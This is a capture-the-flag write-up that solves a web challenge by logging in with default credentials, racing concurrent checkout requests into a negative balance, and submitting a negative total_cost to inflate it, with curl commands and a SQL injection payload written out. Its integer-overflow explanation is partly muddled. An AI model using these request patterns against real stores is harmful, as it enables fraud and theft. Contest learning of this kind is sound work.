# CTF Writeup: Fleg Store

**Author:** Mohamed Armaoui - C4spr0x1A

## Challenge Details
| Category       | Web Exploitation |
|----------------|------------------|
| Challenge Name | Fleg Store       |
| CTF Event      | Blitz CTF 2025   |
| Flag           | `Blitz{FLEG_L00T3R_SH0P}` |

## Solution

This writeup details my approach to solving the "Fleg Store" CTF challenge, which involved exploiting a series of business logic vulnerabilities in an e-commerce application.

### Summary

This challenge involved exploiting a series of business logic vulnerabilities in an e-commerce application. The key steps included:

1.  Initial Reconnaissance: Understanding the application's structure and identifying potential entry points.
2.  Authentication Bypass/Login: Gaining access to a user account.
3.  Race Condition for Negative Balance: Exploiting a race condition during checkout to achieve a negative balance.
4.  Integer Overflow for Balance Manipulation: Utilizing the negative balance to trigger an integer overflow, resulting in a significantly large positive balance.
5.  Flag Acquisition: Purchasing the `flag.txt` with the overflowed balance and locating the flag.

### Detailed Steps

#### Step 1: Initial Reconnaissance and Login

Upon accessing the target website, `https://flegstore-asd8webfs.blitzhack.xyz/login`, it presented a standard login form. There was no visible registration link.

Initial attempts to log in with common default credentials (e.g., admin:admin, user:user) were performed.

```bash
curl -X POST -d "username=admin&password=admin" https://flegstore-asd8webfs.blitzhack.xyz/login
curl -X POST -d "username=user&password=user" https://flegstore-asd8webfs.blitzhack.xyz/login
```

The credentials `user:user` successfully authenticated and redirected to the dashboard. Cookies were saved for subsequent requests.

#### Step 2: Exploring Features and Initial Vulnerability Attempts

After logging in, the dashboard displayed my balance, a coupon generator, and recent coupons. Navigation options included "Shop," "Cart," and "Redeem."

Common e-commerce vulnerabilities were explored:

*   Price Manipulation (Checkout): Attempts to modify `total_cost` during checkout to 0 or other arbitrary values failed, indicating server-side validation.
    *   `curl -b cookies.txt -X POST -d "total_cost=0" https://flegstore-asd8webfs.blitzhack.xyz/checkout`
*   Race Condition (Coupon Generation): Sending multiple concurrent requests to `/generate_coupon` was attempted, but the server consistently returned "Coupon limit reached," indicating a robust rate-limiting mechanism.
    *   `for i in $(seq 1 50); do curl -s -b cookies.txt -X POST -H "Content-Type: application/json" -d "{}" https://flegstore-asd8webfs.blitzhack.xyz/generate_coupon & done ; wait`
*   Negative Quantity/Integer Underflow (Buy Flag): Attempts to buy `flag.txt` with a negative quantity also failed, suggesting input sanitization.
    *   `curl -b cookies.txt -X POST -d "quantity=-1" https://flegstore-asd8webfs.blitzhack.xyz/buy_flag`
*   Injection Attacks (Redeem Coupon): Various payloads for SQL injection and template injection on the `/redeem` endpoint were tried but did not yield any exploitable results.
    *   `curl -b cookies.txt -X POST -d "coupon=' OR 1=1-- " https://flegstore-asd8webfs.blitzhack.xyz/redeem`

#### Step 3: Discovering and Exploiting Race Condition for Negative Balance

Despite initial failures, the challenge description hinted at a subtle business logic flaw. A crucial observation was made after a large number of concurrent checkout requests (`for i in $(seq 1 100); do curl -s -b cookies.txt -X POST -d "total_cost=70" https://flegstore-asd8webfs.blitzhack.xyz/checkout & done ; wait`). While no immediate success was apparent, a later check of the dashboard revealed a negative balance. This indicated a successful race condition, leading to overspending beyond the available funds.

*   Initial balance: 929
*   After race condition attempt, balance: -331

This negative balance was the key indicator of a deeper vulnerability.

#### Step 4: Exploiting Integer Overflow for Balance Manipulation

With a negative balance, the next step was to exploit an integer overflow. The hypothesis was that if the server performed `balance = balance - total_cost` and `total_cost` was a very large negative number, the calculation could wrap around to a large positive number.

1.  Add `flag.txt` to cart:
    *   `curl -b cookies.txt -X POST https://flegstore-asd8webfs.blitzhack.xyz/buy_flag`
2.  Checkout with a large negative `total_cost`: A value like 2147483648 (minimum 32-bit signed integer) was chosen as `total_cost`.
    *   `curl -b cookies.txt -X POST -d "total_cost=-2147483648" https://flegstore-asd8webfs.blitzhack.xyz/checkout`

After this request, checking the dashboard revealed a significantly high positive balance (2147483317), confirming the integer overflow.

#### Step 5: Flag Acquisition

With an immensely large positive balance, the `flag.txt` (cost: 70) could now be purchased.

1.  Add `flag.txt` to cart (if not already there):
    *   `curl -b cookies.txt -X POST https://flegstore-asd8webfs.blitzhack.xyz/buy_flag`
2.  Checkout with the normal cost:
    *   `curl -b cookies.txt -X POST -d "total_cost=70" https://flegstore-asd8webfs.blitzhack.xyz/checkout`

The dashboard or shop page did not immediately reveal the flag. However, given that the "flag.txt" was an item in the store, a direct access attempt to `flag.txt` in the web root was made.

*   `curl -b cookies.txt https://flegstore-asd8webfs.blitzhack.xyz/flag.txt`

This request successfully returned the flag.

## Flag

`Blitz{FLEG_L00T3R_SH0P}`
